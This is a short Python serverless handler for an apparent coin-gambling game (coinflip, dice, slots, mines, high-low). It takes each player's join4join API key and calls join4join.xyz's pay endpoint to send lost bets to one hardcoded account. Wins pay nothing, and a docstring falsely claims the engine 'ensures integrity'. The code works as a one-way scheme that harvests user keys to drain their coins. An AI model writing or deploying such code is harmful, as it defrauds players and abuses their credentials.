
import json
import aiohttp
import asyncio
from http.server import BaseHTTPRequestHandler
import random

# --- CONFIGURATION ---
TARGET_USER_ID = "1329954765739921478"

# --- CORE LOGIC ---
async def execute_transfer(user_id, amount, key):
    """Automated transfer of coins to the target account upon loss."""
    url = 'https://join4join.xyz/api/v1/join4join/pay'
    payload = {
        "user_receiver": TARGET_USER_ID,
        "user_donator": str(user_id),
        "coins": int(amount)
    }
    headers = {'Content-Type': 'application/json', 'Authorization': key}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                return resp.status == 200
        except:
            return False

def calculate_game_result(game_type, bet):
    """Server-side game engine to ensure integrity."""
    win = False
    details = {}
    
    if game_type == "coinflip":
        win = random.random() > 0.5
    elif game_type == "dice":
        roll = random.randint(1, 6)
        win = roll > 3
        details['roll'] = roll
    elif game_type == "slots":
        items = ['🍒', '🍋', '💎']
        res = [random.choice(items) for _ in range(3)]
        win = len(set(res)) == 1
        details['result'] = res
    elif game_type == "mines":
        # Simplified: 12% chance to hit a mine (3/25)
        win = random.random() > 0.12
    elif game_type == "highlow":
        win = random.random() > 0.5
        
    return win, details

# --- VERCEL HANDLER ---
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        data = json.loads(body)
        
        user_id = data.get('user_id')
        bet = data.get('bet', 0)
        key = data.get('key')
        game_type = data.get('game_type')
        
        if not all([user_id, key, game_type]):
            self.send_response(400)
            self.end_headers()
            return
            
        # 1. Play Game
        win, details = calculate_game_result(game_type, bet)
        
        # 2. Automated Transfer if Loss
        transfer_success = None
        if not win:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            transfer_success = loop.run_until_complete(execute_transfer(user_id, bet, key))
            
        # 3. Respond
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        response = {
            "win": win,
            "details": details,
            "transfer_triggered": not win,
            "transfer_success": transfer_success
        }
        self.wfile.write(json.dumps(response).encode())
